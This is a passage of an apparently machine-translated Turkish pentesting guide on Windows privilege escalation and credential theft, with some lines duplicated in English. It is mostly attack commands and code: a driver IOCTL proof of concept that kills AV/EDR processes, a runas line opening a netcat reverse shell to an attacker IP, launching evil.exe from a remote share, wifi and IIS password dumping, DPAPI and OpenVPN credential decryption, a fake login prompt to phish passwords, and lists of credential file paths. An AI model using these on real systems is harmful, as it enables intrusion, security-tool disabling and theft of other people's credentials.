Windows, bir hizmetin başarısız olması durumunda gerçekleştirilecek eylemleri kullanıcıların belirtmesine izin verir. Bu özellik, bir binary'e işaret edecek şekilde yapılandırılabilir. Eğer bu binary değiştirilebilirse, privilege escalation mümkün olabilir. Daha fazla ayrıntı için [resmi belgelere](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bakabilirsiniz.

## Uygulamalar

### Yüklü Uygulamalar

Kontrol edin **binary'lerin izinlerini** (belki birini overwrite ederek privilege escalation elde edebilirsiniz) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Özel bir dosyayı okumak için bazı config file'ları değiştirip değiştiremeyeceğinizi veya Administrator account (schedtasks) tarafından çalıştırılacak bir binary'yi değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload kalıcılığı/çalıştırma

Notepad++ `plugins` alt klasörleri altında herhangi bir plugin DLL'i autoload eder. Eğer yazılabilir bir portable/kopya kurulum mevcutsa, kötü amaçlı bir plugin bırakmak her başlatmada `notepad++.exe` içinde otomatik kod yürütümü sağlar (bunların içinde `DllMain` ve plugin geri çağırmaları da vardır).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştır

**Farklı bir kullanıcı tarafından çalıştırılacak bazı registry anahtarlarını veya binary dosyalarının üzerine yazıp yazamayacağınızı kontrol edin.**\
**Okuyun** **aşağıdaki sayfayı**; ilginç **autoruns locations to escalate privileges** hakkında daha fazla bilgi edinmek için:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf garip/zafiyetli** sürücüleri arayın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Eğer bir driver rastgele bir kernel read/write primitive'i ifşa ediyorsa (kötü tasarlanmış IOCTL handler'larında yaygın), kernel belleğinden doğrudan bir SYSTEM token çalarak yükseltme yapabilirsiniz. Adım adım teknik için bakın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Vulnerable call'ın attacker-controlled Object Manager yolunu açtığı race-condition hatalarında, lookup'u kasıtlı olarak yavaşlatmak (max-length component'lar veya derin dizin zincirleri kullanarak) pencereyi mikro saniyelerden onlarca mikro saniyeye uzatabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive zafiyetleri deterministik layout'ları hazırlamanıza, yazılabilir HKLM/HKU alt dallarını suistimal etmenize ve metadata corruption'ı özel bir driver olmadan kernel paged-pool overflow'larına dönüştürmenize izin veriyor. Tüm zinciri öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver'lar device object'ini IoCreateDeviceSecure ile güçlü bir SDDL kullanarak oluşturuyor fakat DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN'u setlemeyi unutuyorlar. Bu flag olmadan, secure DACL, cihaza ekstra bir component içeren bir yol üzerinden açıldığında uygulanmıyor; bu da herhangi ayrıcalıksız bir kullanıcının şu tür namespace yollarını kullanarak bir handle elde etmesine izin veriyor:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir vaka)

Kullanıcı cihazı açabildiği anda, driver tarafından ifşa edilen privileged IOCTL'lar LPE ve manipülasyon için suiistimal edilebilir. Vahşi ortamda gözlemlenen örnek yetenekler:
- Rastgele process'lere tam erişimli handle döndürme (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Kısıtlamasız raw disk okuma/yazma (offline tampering, boot-time persistence hileleri).
- Korunan Process/Light (PP/PPL) dahil olmak üzere rastgele process'leri sonlandırma, böylece user land'den kernel aracılığıyla AV/EDR kill yapılabilmesi.

Minimal PoC deseni (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için önlemler
- DACL ile kısıtlanması amaçlanan device object'leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN'i ayarlayın.
- Ayrıcalıklı işlemler için çağıran bağlamını doğrulayın. Process sonlandırılmasına veya handle'lerin iade edilmesine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTLs'leri (access masks, METHOD_*, input validation) sınırlandırın ve doğrudan kernel ayrıcalıkları yerine aracılı (brokered) modelleri değerlendirin.

Savunucular için tespit fikirleri
- Şüpheli cihaz adlarının user-mode tarafından açılmalarını (ör. \\ .\\amsdk*) ve kötüye kullanımı gösteren belirli IOCTL dizilerini izleyin.
- Microsoft’ın vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny listelerinizi koruyun.

## PATH DLL Hijacking

Eğer **PATH üzerinde bulunan bir klasörde write permissions**'ınız varsa, bir process tarafından yüklenen bir DLL'i hijack ederek **escalate privileges** elde edebilirsiniz.

PATH içindeki tüm klasörlerin izinlerini kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolü kötüye kullanma hakkında daha fazla bilgi için:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Ağ

### Paylaşımlar
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file içinde hardcoded olan diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlı servisleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Kuralları

[**Firewall ile ilgili komutlar için bu sayfaya bakın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kurallar oluştur, kapat, kapat...)**

Daha fazla[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
İkili `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde bulunabilir

Eğer root user olursanız herhangi bir portta dinleyebilirsiniz (ilk kez `nc.exe` ile bir portta dinlemeye çalıştığınızda GUI üzerinden `nc`'nin firewall tarafından izin verilip verilmeyeceğini soracaktır).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash'i root olarak kolayca başlatmak için `--default-user root` kullanabilirsiniz

WSL dosya sistemini şu klasörde inceleyebilirsiniz: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Kimlik Bilgileri Yöneticisi / Windows Vault

Kaynak: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault, sunucular, web siteleri ve diğer programlar için kullanıcı kimlik bilgilerini depolar; bunlar **Windows** tarafından **kullanıcıların otomatik olarak oturum açması** için kullanılabilir. İlk bakışta, kullanıcıların Facebook, Twitter, Gmail vb. kimlik bilgilerini saklayıp tarayıcılar aracılığıyla otomatik olarak oturum açtıkları izlenimi verebilir. Ancak durum böyle değildir.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini depolar; bu da herhangi bir **Windows uygulamasının bir kaynağa erişmek için kimlik bilgilerine ihtiyaç duyması** (sunucu veya bir web sitesi) durumunda, **bu Credential Manager** & Windows Vault'u kullanabileceği ve kullanıcıların her seferinde kullanıcı adı ve parola girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmezse, belirli bir kaynak için kimlik bilgilerini kullanmaları mümkün olmayacaktır diye düşünüyorum. Bu yüzden uygulamanız vault'u kullanmak istiyorsa, varsayılan depolama vault'undan o kaynak için **credential manager ile iletişim kurup kimlik bilgilerini talep etmeli**.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ardından kaydedilmiş kimlik bilgilerini kullanmak için `/savecred` seçeneği ile `runas` kullanabilirsiniz. Aşağıdaki örnek bir SMB paylaşımı üzerinden uzak bir binary çağırmaktadır.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan kimlik bilgileri setiyle `runas` kullanımı.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Unutmayın ki mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) tarafından elde edilebilir.

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelemesi için bir yöntem sağlar; özellikle Windows işletim sistemi içinde asimetrik özel anahtarların simetrik şifrelenmesi için kullanılır. Bu şifreleme, entropiye önemli katkıda bulunan bir kullanıcı veya sistem sırrı kullanır.

**DPAPI, anahtarların kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla şifrelenmesine olanak tanır**. Sistem tabanlı şifreleme senaryolarında sistemin domain kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenmiş kullanıcı RSA anahtarları, `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır; burada `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)'ıdır. **DPAPI anahtarı, kullanıcının özel anahtarlarını koruyan master key ile aynı dosyada birlikte bulunduğundan**, genellikle 64 bayt rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu; CMD'de `dir` komutuyla içeriğinin listelenemediğini, ancak PowerShell ile listelenebildiğini not etmek önemlidir.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Uygun argümanlar (`/pvk` veya `/rpc`) ile **mimikatz module** `dpapi::masterkey` kullanarak bunu çözebilirsiniz.

Ana parola ile korunan **kimlik bilgileri dosyaları** genellikle şu konumlarda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Uygun `/masterkey` ile **mimikatz module** `dpapi::cred` kullanarak çözebilirsiniz.\
`sekurlsa::dpapi` module ile **memory**'den birçok **DPAPI** **masterkeys** çıkarabilirsiniz (eğer **root** iseniz).

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell credentials** genellikle **scripting** ve otomasyon görevlerinde şifrelenmiş kimlik bilgilerini pratik şekilde saklamak için kullanılır. Bu kimlik bilgileri **DPAPI** ile korunur; bu genellikle oluşturuldukları aynı kullanıcı tarafından aynı bilgisayarda çözülebilecekleri anlamına gelir.

İçeren dosyadan bir PS kimlik bilgisini **decrypt** etmek için şunu yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Kablosuz ağ
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Bunları şu yerlerde bulabilirsiniz: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Son Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgileri Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Uygun `/masterkey` ile **Mimikatz** `dpapi::rdg` modülünü kullanarak herhangi bir .rdg dosyasını **çözün**\

You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module  
Mimikatz `sekurlsa::dpapi` modülü ile bellekten birçok DPAPI masterkey'i **çıkarabilirsiniz**

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.  
Kullanıcılar genellikle Windows iş istasyonlarında StickyNotes uygulamasını bunun bir veritabanı dosyası olduğunu fark etmeden şifreleri ve diğer bilgileri **kaydetmek** için kullanırlar. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
**AppCmd.exe'den şifreleri kurtarmak için Yönetici olmanız ve High Integrity seviyesinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.  
Bu dosya varsa bazı **credentials** yapılandırılmış olabilir ve **kurtarılabilir**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):  
Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)'den çıkarılmıştır:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının var olup olmadığını kontrol edin.\
Yükleyiciler **SYSTEM privileges ile çalıştırılır**, çoğu **DLL Sideloading (Bilgi kaynağı:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Kayıt Defteri (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Sunucu Anahtarları
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Kayıt Defterindeki SSH anahtarları

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarı içinde saklanabilir; bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Bu yolun içinde herhangi bir giriş bulursanız muhtemelen kaydedilmiş bir SSH key'idir. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca decrypt edilebilir.\
Bu teknik hakkında daha fazla bilgi için: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Eğer `ssh-agent` servisi çalışmıyorsa ve sistem açılışında otomatik başlatılmasını istiyorsanız şu komutu çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Birkaç ssh keys oluşturmaya, bunları `ssh-add` ile eklemeye ve bir makineye ssh ile giriş yapmaya çalıştım. Kayıt defteri HKCU\Software\OpenSSH\Agent\Keys mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları ayrıca **metasploit** kullanarak arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

SiteList.xml adlı bir dosyayı ara

### Önbelleğe alınmış GPP Password

Önceden, Group Policy Preferences (GPP) aracılığıyla bir grup makineye özel local administrator hesaplarının dağıtılmasına izin veren bir özellik vardı. Ancak, bu yöntem ciddi güvenlik açıklarına sahipti. Birincisi, SYSVOL'da XML dosyaları olarak saklanan Group Policy Objects (GPOs) herhangi bir domain kullanıcısı tarafından erişilebiliyordu. İkincisi, bu GPP'lerdeki şifreler, kamuya belgelenmiş varsayılan anahtar kullanılarak AES256 ile şifrelenmişti ve herhangi bir kimlikli kullanıcı tarafından çözülebiliyordu. Bu, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine olanak verebileceği için ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, "cpassword" alanı boş olmayan yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir fonksiyon geliştirildi. Böyle bir dosya bulunduğunda, fonksiyon şifreyi çözer ve özel bir PowerShell objesi döndürür. Bu obje GPP hakkında ve dosyanın konumu hakkında bilgiler içerir; bu sayede bu güvenlik açığının tespiti ve giderilmesine yardımcı olur.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista'dan önce)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'i çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec kullanarak passwords almak:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Günlükler
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kullanıcıdan credentials isteyin

Eğer bir kullanıcının onları bilebileceğini düşünüyorsanız, her zaman kullanıcıdan **kendi credentials'ini veya hatta başka bir kullanıcının credentials'ini girmesini isteyebilirsiniz** (doğrudan istemciye **credentials**'i **sormak** gerçekten **risklidir**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials içerebilecek olası dosya adları**

Bir süre önce **passwords** içeren, **clear-text** veya **Base64** formatında bulunan bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
